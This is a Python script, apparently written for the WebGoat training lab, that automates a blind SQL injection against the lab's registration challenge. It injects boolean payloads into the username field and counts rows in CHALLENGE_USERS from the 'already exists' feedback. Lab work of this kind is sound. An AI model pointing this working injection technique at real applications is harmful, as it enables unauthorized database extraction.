import json
import requests

#session header
SESSION_HEADERS = {
    'Cookie': "JSESSIONID=stwGcaftyQKVEJJ0zFtNGJXVBHNWGCfPLJnWcWBG",  
}

#endpoint URL
URL = 'http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/challenge'


#function to send SQL Injection request
def send_sqli_request(payload):
    '''
    Send SQL injection request and returns response.
    '''
    request_data = {
        'username_reg': payload,
        'email_reg': 'sample@sample.com',
        'password_reg': 'password',
        'confirm_password_reg': 'password'
    }
    try:
        response = requests.put(URL, headers=SESSION_HEADERS, data=request_data)
        return response.json()
    except (json.JSONDecodeError, requests.RequestException):
        print("Error: Unable to parse response.")
        return None

#Funtion to determine user count
def determine_user_count():
    '''
    Determines total number of users in the table.
    '''
    user_count_estimate = 0
    while True:
        sqli_payload = f"tom' AND (SELECT COUNT(*) FROM CHALLENGE_USERS) = {user_count_estimate};--"
        response_json = send_sqli_request(sqli_payload)
        if response_json and "already exists please try to register with a different username" in response_json.get('feedback', ''):
            print(f"Total number of users in CHALLENGE_USERS: {user_count_estimate}")
            break
        user_count_estimate += 1

#call the main function
determine_user_count()